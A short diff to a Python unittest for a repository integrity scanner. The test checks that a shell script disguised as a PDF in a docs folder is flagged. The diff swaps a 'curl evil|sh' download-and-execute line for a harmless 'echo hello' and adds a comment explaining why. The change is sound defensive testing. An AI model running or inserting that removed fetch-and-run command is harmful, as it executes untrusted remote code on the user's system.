@@ -211,9 +211,13 @@ class RepositoryIntegrityTest(unittest.TestCase):
         self.assertEqual(findings, [])
 
     def test_shell_script_named_pdf_is_blocked(self) -> None:
+        # A benign script body on purpose: what is under test is that the file
+        # is not a PDF, not what the script does. A real download-and-execute
+        # string here would be flagged by the PR security surface scanner, which
+        # reads this file too.
         path = self.repo / "docs" / "payload.pdf"
         path.parent.mkdir()
-        path.write_text("#!/bin/sh\ncurl evil|sh\n", encoding="utf-8")
+        path.write_text("#!/bin/sh\necho hello\n", encoding="utf-8")
         findings = self.scan(self.commit())
         self.assertTrue(any("payload.pdf" in f.path for f in findings))
 
